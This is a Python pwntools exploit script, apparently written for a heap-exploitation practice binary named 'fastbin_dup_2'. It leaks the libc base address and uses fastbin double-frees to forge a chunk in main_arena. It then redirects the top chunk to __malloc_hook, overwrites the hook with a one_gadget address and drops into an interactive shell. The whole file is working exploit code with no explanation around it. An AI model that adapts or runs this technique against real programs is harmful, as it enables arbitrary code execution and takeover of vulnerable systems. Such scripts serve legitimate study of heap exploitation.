#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup_2")
libc = ELF(elf.runpath + b"/libc.so.6") 

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

io = start()

io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1
log.info(hex(libc.address))



chunk1 = malloc(0x48,b"A"*8)
chunk2 = malloc(0x48,b"B"*8)

free(chunk1)
free(chunk2)
free(chunk1)

# Create a fake size in main_arena
malloc(0x48,p64(0x61))
malloc(0x48,"C"*8)
malloc(0x48,"Z"*8)

# Trigger dup again
chunk3 = malloc(0x58, "J"*8)
chunk4 = malloc(0x58, "X"*8)

free(chunk3)
free(chunk4)
free(chunk3)

# Link the fake chunk in 0x60.
malloc(0x58, p64(libc.sym.main_arena + 0x20))
malloc(0x58, b"-s\0"*8)
malloc(0x58, b"M"*8)

# Overwrite the top chunk pointer
malloc(0x58, b"Y"*48 + p64(libc.sym.__malloc_hook - 35))
#malloc(0x28, b"Y"*19 + p64(0xdeadbeef))

# Overwrite the malloc hook
malloc(0x28, b"Y"*19 + p64(libc.address + 0xe1fa1))
malloc(1,"")


#gdb.attach(io)
io.interactive()
